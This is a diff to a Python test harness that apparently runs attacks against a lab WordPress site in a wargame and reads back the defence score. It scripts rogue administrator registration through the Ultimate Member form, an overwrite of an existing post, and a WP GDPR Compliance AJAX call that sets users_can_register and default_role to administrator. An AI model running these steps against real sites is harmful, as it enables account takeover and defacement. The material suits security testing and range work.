-def record_corp_window(session_id, name, fired_at, done_at):
-    recorded = requests.post(
-        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/",
-        json={
-            "case_id": f"{name}-{uuid.uuid4().hex[:8]}",
-            "name": name,
-            "malicious": True,
-            "correlation": "marker",
-            "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
-            "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
-        },
-        timeout=60,
-    )
-    assert recorded.status_code == 201, recorded.text
-
-
-def judged_corp(session_id):
-    observed = requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120).json()
-    credited, score = finished(
-        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60).json(),
-        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60).json(),
-    )
-    return {
-        "observed": observed,
-        "credited": {o["key"] for o in credited.result()},
-        "score": score.result(),
-    }
+def lost_keys(played: plays.Played, wanted: set[str]) -> set[str]:
+    deadline = time.monotonic() + EFFECT_WAIT
+    while True:
+        lost = {line["key"] for line in plays.defence_seen(played)["objectives"] if line["state"] == "lost"}
+        if wanted <= lost or time.monotonic() >= deadline:
+            return lost
+        time.sleep(plays.POLL)
 
 
 def rogue_admin_run():
-    with shared_session(wargame="corp") as session_id:
-        opened = time.monotonic()
-        before = run_side_by_side(CORP_DB, {"admins": ADMINS, "post": FIRST_POST}, session=session_id)
+    with plays.Round(CORP) as played:
+        before = run_side_by_side(CORP_DB, {"admins": ADMINS, "post": FIRST_POST}, lease=played.lease)
         baseline, original = ids_in(before["admins"].stdout), first_post_in(before["post"].stdout)
-        seen = {"session_id": session_id, "baseline": baseline, "created": set(), "original": original}
-        try:
-            settled(opened, SETTLE_SECONDS)
-            fired_at = datetime.now(timezone.utc)
-            nonce, seen["code"] = with_nonce(
-                "/register/", REGISTER_NONCE, registration(f"rogue_{uuid.uuid4().hex[:8]}"),
-                session=session_id,
-            )
-            done_at = datetime.now(timezone.utc)
-            gap_from = time.monotonic()
-            assert nonce, "no _wpnonce on the live UM register form; is corp-wp up?"
-            admins, recorded = finished(
-                lambda: admin_ids(session_id),
-                lambda: record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at),
-            )
-            seen["admins"] = admins.result()
-            seen["created"] = seen["admins"] - baseline
-            recorded.result()
-            settled(gap_from, WINDOW_GAP_SECONDS)
-            fired_at = datetime.now(timezone.utc)
-            nonce, seen["overwrite"] = with_nonce(
-                "/submit-a-story/", SUBMISSION_NONCE, post_overwrite(original["ID"]), session=session_id,
-            )
-            done_at = datetime.now(timezone.utc)
-            assert nonce, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
-            overwritten, recorded = finished(
-                lambda: post_row(original["ID"], session_id),
-                lambda: record_corp_window(session_id, "corp-content-write", fired_at, done_at),
-            )
-            seen["overwritten"] = overwritten.result()
-            recorded.result()
-            seen.update(judged_corp(session_id))
-        finally:
-            run_in_turn(CORP, site_restored(seen["created"], original), timeout=180, session=session_id)
-            after = run_in_turn(CORP_DB, {
-                "content": content_restored(original),
-                "admins": ADMINS,
-                "post": post_query(original["ID"]),
-            }, session=session_id)
-            seen["admins_left"] = ids_in(after["admins"].stdout)
-            seen["restored"] = post_in(after["post"].stdout)
+        seen = {"round": played.round, "baseline": baseline, "original": original}
+        nonce = nonce_from(played, "/register/", REGISTER_NONCE)
+        assert nonce, "no _wpnonce on the live UM register form; is corp-wp up?"
+        seen["registered"] = posted(played, "/register/", registration(f"rogue_{uuid.uuid4().hex[:8]}", nonce))
+        seen["admins"] = admin_ids(played.lease)
+        seen["created"] = seen["admins"] - baseline
+        nonce = nonce_from(played, "/submit-a-story/", SUBMISSION_NONCE)
+        assert nonce, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
+        seen["overwrite"] = posted(played, "/wp-admin/admin-ajax.php", post_overwrite(original["ID"], nonce))
+        seen["overwritten"] = post_row(original["ID"], played.lease)
+        seen["lost"] = lost_keys(played, {"corp-rogue-admin", "corp-content-overwrite"})
+        plays.end(played)
+        seen["score"] = plays.score(played).body
     return seen
 
 
 def option_flip_run():
-    with shared_session(wargame="corp") as session_id:
-        opened = time.monotonic()
-        seen = {"session_id": session_id}
-        try:
-            settled(opened, SETTLE_SECONDS)
-            fired_at = datetime.now(timezone.utc)
-            nonce, said = with_nonce(
-                "/", AJAX_NONCE,
-                option_flip("users_can_register", "1"), option_flip("default_role", "administrator"),
-                session=session_id,
-            )
-            done_at = datetime.now(timezone.utc)
-            assert nonce, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
-            seen["flips"] = tuple(said.split())
-            options, recorded = finished(
-                lambda: run_side_by_side(CORP_DB, {
-                    name: option_query(name) for name in ("users_can_register", "default_role")
-                }, session=session_id),
-                lambda: record_corp_window(session_id, "corp-self-registration", fired_at, done_at),
-            )
-            read = options.result()
-            seen["registration_open"] = read["users_can_register"].stdout.strip()
-            seen["default_role"] = read["default_role"].stdout.strip()
-            recorded.result()
-            seen.update(judged_corp(session_id))
-        finally:
-            left = run_in_turn(CORP_DB, {
-                "closed": option_update("users_can_register", "0"),
-                "subscriber": option_update("default_role", "subscriber"),
-                "users_can_register": option_query("users_can_register"),
-                "default_role": option_query("default_role"),
-            }, session=session_id)
-            seen["options_left"] = (
-                left["users_can_register"].stdout.strip(), left["default_role"].stdout.strip()
-            )
+    with plays.Round(CORP) as played:
+        seen = {"round": played.round}
+        nonce = nonce_from(played, "/", AJAX_NONCE)
+        assert nonce, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
+        flipping = {"action": "wpgdprc_process_action", "security": nonce}
+        seen["flips"] = tuple(
+            posted(played, "/wp-admin/admin-ajax.php", option_flip(name, value), flipping).body["status"]
+            for name, value in (("users_can_register", "1"), ("default_role", "administrator")))
+        read = run_side_by_side(CORP_DB, {name: option_query(name) for name in ("users_can_register", "default_role")},
+                                lease=played.lease)
+        seen["registration_open"] = read["users_can_register"].stdout.strip()
+        seen["default_role"] = read["default_role"].stdout.strip()
+        seen["lost"] = lost_keys(played, {"corp-self-registration"})
+        plays.end(played)
+        seen["score"] = plays.score(played).body
     return seen
+
+
+def finished(*calls):
+    with ThreadPoolExecutor(max_workers=len(calls)) as pool:
+        return [pool.submit(call) for call in calls]
 
 
 @pytest.fixture(scope="session")
